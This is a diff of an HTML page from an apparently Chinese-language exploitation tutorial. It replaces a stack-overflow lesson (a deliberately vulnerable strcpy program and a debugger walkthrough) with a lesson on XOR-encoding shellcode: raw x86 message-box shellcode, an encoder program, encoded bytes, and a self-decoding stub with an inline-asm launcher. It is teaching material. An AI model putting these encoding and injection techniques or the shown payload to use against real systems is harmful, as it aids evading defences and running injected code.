@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>2.4redirect EIP to executed extra binary code in buffer</title>
+<title>3.3Encode shellcode</title>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <style type="text/css">
 /* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
@@ -468,111 +468,133 @@ vertical-align:1px;
 </style>
 </head>
 <body>
-<h1 id="redirect-eip-to-executed-extra-binary-code-in-buffer">Redirect EIP to executed extra binary code in buffer</h1>
-<p><strong>Author：wnagzihxain<br>Mail：tudouboom@163.com</strong></p>
-<pre><code>#include &lt;stdio.h&gt;
-#include &lt;windows.h&gt;
-#define PASSWORD &quot;1234567&quot;
+<h1 id="encode-shellcode">Encode shellcode</h1>
+<p><strong>Author：wnagzihxa1n<br>Mail：tudouboom@163.com</strong></p>
+<pre><code>#include &quot;stdio.h&quot;
 
-int verify_password (char *password)
+char popup_general[]=
+&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;
+&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;
+&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;
+&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;
+&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;
+&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;
+&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;
+&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;
+&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;
+&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;
+&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90&quot;;//shellcode should be ended with 0x90
+
+void encoder (char* input, unsigned char key, int display_flag)// bool display_flag
 {
-    int authenticated;
-    char buffer[44];
-    authenticated = strcmp(password, PASSWORD);
-    strcpy(buffer, password);//over flowed here!    
-    return authenticated;
+    int i = 0, len = 0;
+    FILE * fp;
+    unsigned char * output;
+    len = strlen(input);
+    output = (unsigned char *)malloc(len + 1);
+    if(!output)
+    {
+        printf(&quot;memory erro!\n&quot;);
+        exit(0);
+    }
+    //encode the shellcode
+    for(i = 0; i &lt; len; i++)
+    {
+        output[i] = input[i] ^ key;
+    }
+    if(!(fp = fopen(&quot;encode.txt&quot;, &quot;w+&quot;)))
+    {
+        printf(&quot;output file create erro&quot;);
+        exit(0);
+    }
+    fprintf(fp, &quot;\&quot;&quot;);
+    for(i = 0; i &lt; len; i++)
+    {        
+        fprintf(fp, &quot;\\x%0.2x&quot;, output[i]);
+        if((i + 1) % 16 == 0)
+        {            
+            fprintf(fp, &quot;\&quot;\n\&quot;&quot;);
+        }
+    }
+    fprintf(fp, &quot;\&quot;;&quot;);
+    fclose(fp);
+    printf(&quot;dump the encoded shellcode to encode.txt OK!\n&quot;);
+    if(display_flag)//print to screen
+    {
+        for(i = 0; i &lt; len; i++)
+        {
+            printf(&quot;%0.2x &quot;, output[i]);
+            if((i + 1) % 16 == 0)
+            {
+                printf(&quot;\n&quot;);
+            }
+        }
+    }
+    free(output);
 }
 
 int main()
 {
-    int valid_flag = 0;
-    char password[1024];
-    FILE * fp;
-    LoadLibrary(&quot;user32.dll&quot;);//prepare for messagebox
-    if(!(fp=fopen(&quot;password.txt&quot;, &quot;rw+&quot;)))
-    {
-        exit(0);
-    }
-    fscanf(fp,&quot;%s&quot;, password);
-    valid_flag = verify_password(password);
-    if(valid_flag)
-    {
-        printf(&quot;incorrect password!\n&quot;);
-    }
-    else
-    {
-        printf(&quot;Congratulation! You have passed the verification!\n&quot;);
-    }
-    fclose(fp);
+    encoder(popup_general, 0x44, 1);
+    getchar();
     return 0;
 }
-</code></pre><p>小修改了代码，加上最后一个pause</p>
-<p>依旧找到main入口，最后提示一次</p>
-<pre><code>004019F0  |.  FF15 88014300 call dword ptr ds:[&lt;&amp;KERNEL32.GetCommandLineA&gt;]         ; [GetCommandLineA
-</code></pre><p>一般情况下，在这个边上有三次压栈操作的call就是main函数</p>
-<p>找到main函数入口后直接F4到这，也可以下断，然后F9到这，或者F8慢慢走下来</p>
+</code></pre><p>运行后</p>
+<pre><code>encoded shellcode (key=0x44):
+
+&quot;\xb8\x2c\x2e\x4e\x7c\x5a\x2c\x27\xcd\x95\x0b\x2c\x76\x30\xd5\x48&quot;
+&quot;\xcf\xb0\xc9\x3a\xb0\x77\x9f\xf3\x40\x6f\xa7\x22\xff\x77\x76\x17&quot;
+&quot;\x2c\x31\x37\x21\x36\x10\x77\x96\x20\xcf\x1e\x74\xcf\x0f\x48\xcf&quot;
+&quot;\x0d\x58\xcf\x4d\xcf\x2d\x4c\xe9\x79\x2e\x4e\x7c\x5a\x31\x41\xd1&quot;
+&quot;\xbb\x13\xbc\xd1\x24\xcf\x01\x78\xcf\x08\x41\x3c\x47\x89\xcf\x1d&quot;
+&quot;\x64\x47\x99\x77\xbb\x03\xcf\x70\xff\x47\xb1\xdd\x4b\xfa\x42\x7e&quot;
+&quot;\x80\x30\x4c\x85\x8e\x43\x47\x94\x02\xaf\xb5\x7f\x10\x60\x58\x31&quot;
+&quot;\xa0\xcf\x1d\x60\x47\x99\x22\xcf\x78\x3f\xcf\x1d\x58\x47\x99\x47&quot;
+&quot;\x68\xff\xd1\x1b\xef\x13\x25\x79\x2e\x4e\x7c\x5a\x31\xed\x77\x9f&quot;
+&quot;\x17\x2c\x33\x21\x37\x30\x2c\x22\x25\x2d\x28\xcf\x80\x17\x14\x14&quot;
+&quot;\x17\xbb\x13\xb8\x17\xbb\x13\xbc\xd4&quot;;
+</code></pre><p>最后完整的代码</p>
+<pre><code>char final_sc_44[] = 
+&quot;\x83\xC0\x14&quot;          //ADD EAX,14
+&quot;\x33\xC9&quot;             //XOR ECX,ECX
+&quot;\x8A\x1C\x08&quot;           //MOV BL,BYTE PTR DS:[EAX+ECX]
+&quot;\x80\xF3\x44&quot;          //XOR BL,44   //notice 0x44 is taken as temp key to decode !
+&quot;\x88\x1C\x08&quot;           //MOV BYTE PTR DS:[EAX+ECX],BL
+&quot;\x41&quot;               //INC ECX
+&quot;\x80\xFB\x90&quot;          //CMP BL,90
+&quot;\x75\xF1&quot;            //JNZ SHORT decoder.00401034
+&quot;\xb8\x2c\x2e\x4e\x7c\x5a\x2c\x27\xcd\x95\x0b\x2c\x76\x30\xd5\x48&quot;
+&quot;\xcf\xb0\xc9\x3a\xb0\x77\x9f\xf3\x40\x6f\xa7\x22\xff\x77\x76\x17&quot;
+&quot;\x2c\x31\x37\x21\x36\x10\x77\x96\x20\xcf\x1e\x74\xcf\x0f\x48\xcf&quot;
+&quot;\x0d\x58\xcf\x4d\xcf\x2d\x4c\xe9\x79\x2e\x4e\x7c\x5a\x31\x41\xd1&quot;
+&quot;\xbb\x13\xbc\xd1\x24\xcf\x01\x78\xcf\x08\x41\x3c\x47\x89\xcf\x1d&quot;
+&quot;\x64\x47\x99\x77\xbb\x03\xcf\x70\xff\x47\xb1\xdd\x4b\xfa\x42\x7e&quot;
+&quot;\x80\x30\x4c\x85\x8e\x43\x47\x94\x02\xaf\xb5\x7f\x10\x60\x58\x31&quot;
+&quot;\xa0\xcf\x1d\x60\x47\x99\x22\xcf\x78\x3f\xcf\x1d\x58\x47\x99\x47&quot;
+&quot;\x68\xff\xd1\x1b\xef\x13\x25\x79\x2e\x4e\x7c\x5a\x31\xed\x77\x9f&quot;
+&quot;\x17\x2c\x33\x21\x37\x30\x2c\x22\x25\x2d\x28\xcf\x80\x17\x14\x14&quot;
+&quot;\x17\xbb\x13\xb8\x17\xbb\x13\xbc\xd4&quot;;
+
+int main()
+{
+    __asm
+    {
+        lea eax, final_sc_44
+        push        eax
+        ret
+
+    }
+    return 0;
+}
+</code></pre><p>解释一下整个过程</p>
+<p>打注释的汇编是解码用的，对后面的乱七八糟的指令进行解码，你也可以载入OD看看，后面有部分是非法的，而其它也是不知道在表达什么</p>
 <p><img src="Image/1.png" alt=""></p>
-<p>然后F7跟入，这是主函数领空，关于这种领空的提醒以后就不说啦，可以看到user32.dll的调用</p>
+<p>我们来看看在OD里恢复真正的shellcode</p>
 <p><img src="Image/2.png" alt=""></p>
-<p>往下拉，找到verify_password ()函数的调用代码，至于怎么看出来这是哪个函数的调用的问题？多调试就会有经验了</p>
+<p>一路跳啊跳，来到这，可以看到这个就是shellcode头部解码语句，那我们就来运行几个循环先还原出部分代码</p>
 <p><img src="Image/3.png" alt=""></p>
-<p>F4运行到这里，或者下断然后F9运行到这都行，看个人喜欢，以后直接说运行到这，个人喜欢下断，然后F9</p>
-<p>F7跟进去，以后F7这些快捷键也尽量少提，因为随着代码越来越长，分析的时候如果连这些基本的都要提，那么还是先回去看前面的分析好了</p>
-<p>跟进来后往下拉，根据前面的几次分析，咱们已经能很快的知道buffer数组在内存中的大概相对位置了，所以在如图位置下断，原因参见上一篇文章</p>
+<p>可以看到前面的已经还原出来了，但是这么多循环如果一个一个F8肯定很累，所以技巧来了，先还原出shellcode的第一句，确定第一句要完全还原，然后在还原出来的第一句下断点，然后F9，直接所有代码都还原了</p>
 <p><img src="Image/4.png" alt=""></p>
-<p>运行起来，观察栈的布局</p>
-<p><img src="Image/5.png" alt=""></p>
-<pre><code>0012FAF0   34333231  1234
-0012FAF4   00373635  567.
-0012FAF8   CCCCCCCC  烫烫
-0012FAFC   CCCCCCCC  烫烫
-0012FB00   CCCCCCCC  烫烫
-0012FB04   CCCCCCCC  烫烫
-0012FB08   CCCCCCCC  烫烫
-0012FB0C   CCCCCCCC  烫烫
-0012FB10   CCCCCCCC  烫烫
-0012FB14   CCCCCCCC  烫烫
-0012FB18   CCCCCCCC  烫烫
-0012FB1C   00000000  ....
-0012FB20  /0012FF80  €.
-0012FB24  |00401118  @.  返回到 stack_ov.mainshort_argingAblock_pages+88 来自 stack_ov.00401005
-0012FB28  |0012FB7C  |?.   ASCII &quot;1234567&quot;
-</code></pre><p>然后修改password.txt为11个“4321”</p>
-<p>运行观察栈的布局</p>
-<p><img src="Image/6.png" alt=""></p>
-<pre><code>0012FAF0   31323334  4321
-0012FAF4   31323334  4321
-0012FAF8   31323334  4321
-0012FAFC   31323334  4321
-0012FB00   31323334  4321
-0012FB04   31323334  4321
-0012FB08   31323334  4321
-0012FB0C   31323334  4321
-0012FB10   31323334  4321
-0012FB14   31323334  4321
-0012FB18   31323334  4321
-0012FB1C   00000000  ....
-0012FB20  /0012FF80  €.
-0012FB24  |00401118  @.  返回到 stack_ov.mainshort_argingAblock_pages+88 来自 stack_ov.00401005
-0012FB28  |0012FB7C  |?.   ASCII &quot;43214321432143214321432143214321432143214321&quot;
-</code></pre><p>如果是按照前面的，那接下来就很清楚了，但是接下来我们是要植入代码，所以要加点新东西进去</p>
-<p>打开Dependency Walker，在Tools里可以找到，然后随便拉一个图标进去</p>
-<p><img src="Image/7.png" alt=""></p>
-<p>然后可以看到user32.dll的基址，以及MessageBoxA的偏移</p>
-<pre><code>0x77D10000 + 0x000407EA = 0x77D507EA
-</code></pre><p>用工具计算</p>
-<p><img src="Image/8.png" alt=""></p>
-<p>不同计算机情况不一样 ，这个一定要在自己的计算机重新计算</p>
-<p>然后就可以编辑password.txt了，一定要注意最后<code>mov eax,77D507EA</code>，要根据自己计算机计算</p>
-<p><img src="Image/9.png" alt=""></p>
-<p>运行起来走啊走，来看看刚刚写的代码</p>
-<p><img src="Image/10.png" alt=""></p>
-<p>继续走</p>
-<p><img src="Image/11.png" alt=""></p>
-<p>弹出来了</p>
-<p>点击确定，继续运行</p>
-<p><img src="Image/12.png" alt=""></p>
-<p>因为调用完MessageBoxA后，没有写后续代码让它退出，所以崩溃了</p>
 
 </body>
 </html>
